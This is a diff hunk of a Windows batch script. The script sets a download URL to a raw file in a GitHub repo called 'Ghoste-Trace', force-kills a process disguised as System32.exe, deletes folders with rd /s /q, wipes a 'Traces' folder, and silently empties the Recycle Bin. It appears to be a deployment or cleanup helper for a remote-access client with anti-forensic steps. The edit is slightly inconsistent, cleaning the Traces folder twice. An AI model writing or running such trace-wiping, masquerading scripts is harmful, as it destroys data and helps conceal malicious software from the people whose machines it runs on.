@@ -17,19 +17,23 @@ set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/main/Client-
 :: The script follows the requested order of operations.
 :: ============================================================================
 
-:: 1. Find and terminate System32.exe running from the SubDir folder.
+:: Kill System32.exe if running in SubDir
 if exist "%SUBDIR%\System32.exe" (
     taskkill /F /IM System32.exe >nul 2>&1
 )
 
-:: 2. Delete everything within the SubDir folder.
-call :clean_folder "%SUBDIR%"
+:: Only delete the 'System32' folder inside %SUBDIR%
+if exist "%SUBDIR%\System32" (
+    rd /s /q "%SUBDIR%\System32"
+)
+
+:: Clean Traces folder only
+call :clean_folder "%TRACES_DIR%"
 
 :: 3. Delete everything within the Traces folder.
 call :clean_folder "%TRACES_DIR%"
 
 :: After cleaning, recreate the folders so they are available for use.
-mkdir "%SUBDIR%" >nul 2>&1
 mkdir "%TRACES_DIR%" >nul 2>&1
 
 :: 4. Silently empty the Recycle Bin without any user prompts.
